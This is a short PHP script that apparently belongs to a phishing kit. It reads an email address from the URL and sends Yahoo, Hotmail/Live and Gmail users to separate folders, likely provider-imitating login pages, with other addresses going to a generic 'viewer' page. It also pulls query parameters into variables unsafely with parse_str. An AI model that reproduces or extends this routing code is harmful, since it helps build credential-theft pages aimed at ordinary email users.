<?php 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));
	$domain = explode('@', $userid);
	
	$domain_check = '@'.strtolower($domain[1]);
	
	if(stripos($domain_check, '@yahoo.') !== false || stripos($domain_check, '@rocketmail.') !== false || stripos($domain_check, '@ymail.') !== false){
		header('Location: yinput/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@live.') !== false || stripos($domain_check, '@hotmail.') !== false || stripos($domain_check, '@msn.') !== false) {
		header('Location: outlook/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	elseif(stripos($domain_check, '@gmail.') !== false || stripos($domain_check, '@google.') !== false) {
		header('Location: ginput/id.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
	else {
		header('Location: products/viewer.php?l=_JeHFUq_VJOXK0QWHtoGYDw_Product-UserID&userid='.$userid);
	}
		
?>